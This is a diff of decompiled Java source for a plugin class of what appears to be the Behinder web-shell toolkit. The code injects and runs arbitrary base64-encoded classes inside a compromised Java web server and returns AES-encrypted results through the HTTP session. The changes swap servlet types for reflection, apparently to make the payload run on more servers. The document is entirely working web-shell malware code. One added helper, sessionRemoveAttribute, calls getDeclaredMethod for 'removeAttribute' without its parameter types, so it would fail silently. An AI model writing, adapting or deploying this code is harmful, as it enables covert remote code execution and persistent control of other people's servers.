@@ -1,31 +1,28 @@
 package net.rebeyond.behinder.payload.java;
 
 import java.lang.reflect.Method;
+import java.util.Enumeration;
 import java.util.HashMap;
 import java.util.Iterator;
 import java.util.Map;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
-import javax.servlet.ServletOutputStream;
-import javax.servlet.ServletRequest;
-import javax.servlet.ServletResponse;
-import javax.servlet.http.HttpSession;
 
 public class Plugin {
    public static String taskID;
    public static String action;
    public static String payload;
-   private ServletRequest Request;
-   private ServletResponse Response;
-   private HttpSession Session;
+   private Object Request;
+   private Object Response;
+   private Object Session;
 
    public boolean equals(Object obj) {
       HashMap result = new HashMap();
 
       try {
          this.fillContext(obj);
-      } catch (Exception var44) {
-         result.put("msg", var44.getMessage());
+      } catch (Exception var46) {
+         result.put("msg", var46.getMessage());
          result.put("status", "fail");
          return true;
       }
@@ -33,45 +30,102 @@ public class Plugin {
       if (action.equals("submit")) {
          ClassLoader classLoader = this.getClass().getClassLoader();
          Class urlClass = ClassLoader.class;
-         boolean var37 = false;
+         boolean var39 = false;
 
-         ServletOutputStream so = null;
+         Object so;
+         Method write;
          label230: {
             try {
-               var37 = true;
+               var39 = true;
                Method method = urlClass.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                method.setAccessible(true);
                byte[] payloadData = this.base64decode(payload);
                Class payloadCls = (Class)method.invoke(classLoader, payloadData, 0, payloadData.length);
                Object payloadObj = payloadCls.newInstance();
-               Method payloadMethod = payloadCls.getDeclaredMethod("execute", ServletRequest.class, ServletResponse.class, HttpSession.class);
+               Method payloadMethod = payloadCls.getDeclaredMethod("execute", Object.class, Object.class, Object.class);
                payloadMethod.invoke(payloadObj, this.Request, this.Response, this.Session);
                result.put("msg", "任务提交成功");
                result.put("status", "success");
-               var37 = false;
+               var39 = false;
                break label230;
-            } catch (Exception var45) {
-               result.put("msg", var45.getMessage());
+            } catch (Exception var47) {
+               result.put("msg", var47.getMessage());
                result.put("status", "fail");
-               var37 = false;
+               var39 = false;
             } finally {
-               if (var37) {
+               if (var39) {
                   try {
-                     so = this.Response.getOutputStream();
-                     so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-                     so.flush();
-                     so.close();
-                  } catch (Exception var39) {
+                     so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+                     write = so.getClass().getDeclaredMethod("write", byte[].class);
+                     write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+                     so.getClass().getDeclaredMethod("flush").invoke(so);
+                     so.getClass().getDeclaredMethod("close").invoke(so);
+                  } catch (Exception var41) {
                   }
 
                }
             }
 
             try {
-               so = this.Response.getOutputStream();
-               so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-               so.flush();
-               so.close();
+               so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+               write = so.getClass().getDeclaredMethod("write", byte[].class);
+               write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+               so.getClass().getDeclaredMethod("flush").invoke(so);
+               so.getClass().getDeclaredMethod("close").invoke(so);
+            } catch (Exception var44) {
+            }
+
+            return true;
+         }
+
+         try {
+            so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+            write = so.getClass().getDeclaredMethod("write", byte[].class);
+            write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+            so.getClass().getDeclaredMethod("flush").invoke(so);
+            so.getClass().getDeclaredMethod("close").invoke(so);
+         } catch (Exception var45) {
+         }
+      } else if (action.equals("getResult")) {
+         boolean var27 = false;
+
+         Object so;
+         Method write;
+         label231: {
+            try {
+               var27 = true;
+               Map taskResult = (Map)this.sessionGetAttribute(this.Session, taskID);
+               Map temp = new HashMap();
+               temp.put("running", taskResult.get("running"));
+               temp.put("result", this.base64encode((String)taskResult.get("result")));
+               result.put("msg", this.buildJson(temp, false));
+               result.put("status", "success");
+               var27 = false;
+               break label231;
+            } catch (Exception var49) {
+               result.put("msg", var49.getMessage());
+               result.put("status", "fail");
+               var27 = false;
+            } finally {
+               if (var27) {
+                  try {
+                     so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+                     write = so.getClass().getDeclaredMethod("write", byte[].class);
+                     write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+                     so.getClass().getDeclaredMethod("flush").invoke(so);
+                     so.getClass().getDeclaredMethod("close").invoke(so);
+                  } catch (Exception var40) {
+                  }
+
+               }
+            }
+
+            try {
+               so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+               write = so.getClass().getDeclaredMethod("write", byte[].class);
+               write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+               so.getClass().getDeclaredMethod("flush").invoke(so);
+               so.getClass().getDeclaredMethod("close").invoke(so);
             } catch (Exception var42) {
             }
 
@@ -79,61 +133,12 @@ public class Plugin {
          }
 
          try {
-            so = this.Response.getOutputStream();
-            so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-            so.flush();
-            so.close();
+            so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+            write = so.getClass().getDeclaredMethod("write", byte[].class);
+            write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+            so.getClass().getDeclaredMethod("flush").invoke(so);
+            so.getClass().getDeclaredMethod("close").invoke(so);
          } catch (Exception var43) {
-         }
-      } else if (action.equals("getResult")) {
-         boolean var25 = false;
-
-         ServletOutputStream so = null;
-         label231: {
-            try {
-               var25 = true;
-               Map taskResult = (Map)this.Session.getAttribute(taskID);
-               Map temp = new HashMap();
-               temp.put("running", taskResult.get("running"));
-               temp.put("result", this.base64encode((String)taskResult.get("result")));
-               result.put("msg", this.buildJson(temp, false));
-               result.put("status", "success");
-               var25 = false;
-               break label231;
-            } catch (Exception var47) {
-               result.put("msg", var47.getMessage());
-               result.put("status", "fail");
-               var25 = false;
-            } finally {
-               if (var25) {
-                  try {
-                     so = this.Response.getOutputStream();
-                     so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-                     so.flush();
-                     so.close();
-                  } catch (Exception var38) {
-                  }
-
-               }
-            }
-
-            try {
-               so = this.Response.getOutputStream();
-               so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-               so.flush();
-               so.close();
-            } catch (Exception var40) {
-            }
-
-            return true;
-         }
-
-         try {
-            so = this.Response.getOutputStream();
-            so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-            so.flush();
-            so.close();
-         } catch (Exception var41) {
          }
       }
 
@@ -141,7 +146,7 @@ public class Plugin {
    }
 
    private byte[] Encrypt(byte[] bs) throws Exception {
-      String key = this.Session.getAttribute("u").toString();
+      String key = this.Session.getClass().getDeclaredMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
       byte[] raw = key.getBytes("utf-8");
       SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
       Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
@@ -232,16 +237,54 @@ public class Plugin {
 
    private void fillContext(Object obj) throws Exception {
       if (obj.getClass().getName().indexOf("PageContext") >= 0) {
-         this.Request = (ServletRequest)obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
-         this.Response = (ServletResponse)obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
-         this.Session = (HttpSession)obj.getClass().getDeclaredMethod("getSession").invoke(obj);
+         this.Request = obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
+         this.Response = obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
+         this.Session = obj.getClass().getDeclaredMethod("getSession").invoke(obj);
       } else {
          Map objMap = (Map)obj;
-         this.Session = (HttpSession)objMap.get("session");
-         this.Response = (ServletResponse)objMap.get("response");
-         this.Request = (ServletRequest)objMap.get("request");
+         this.Session = objMap.get("session");
+         this.Response = objMap.get("response");
+         this.Request = objMap.get("request");
       }
 
-      this.Response.setCharacterEncoding("UTF-8");
+      this.Response.getClass().getDeclaredMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
+   }
+
+   private Object sessionGetAttribute(Object session, String key) {
+      Object result = null;
+
+      try {
+         result = session.getClass().getDeclaredMethod("getAttribute", String.class).invoke(session, key);
+      } catch (Exception var5) {
+      }
+
+      return result;
+   }
+
+   private void sessionSetAttribute(Object session, String key, Object value) {
+      try {
+         session.getClass().getDeclaredMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
+      } catch (Exception var5) {
+      }
+
+   }
+
+   private Enumeration sessionGetAttributeNames(Object session) {
+      Enumeration result = null;
+
+      try {
+         result = (Enumeration)session.getClass().getDeclaredMethod("getAttributeNames").invoke(session);
+      } catch (Exception var4) {
+      }
+
+      return result;
+   }
+
+   private void sessionRemoveAttribute(Object session, String key) {
+      try {
+         session.getClass().getDeclaredMethod("removeAttribute").invoke(session, key);
+      } catch (Exception var4) {
+      }
+
    }
 }
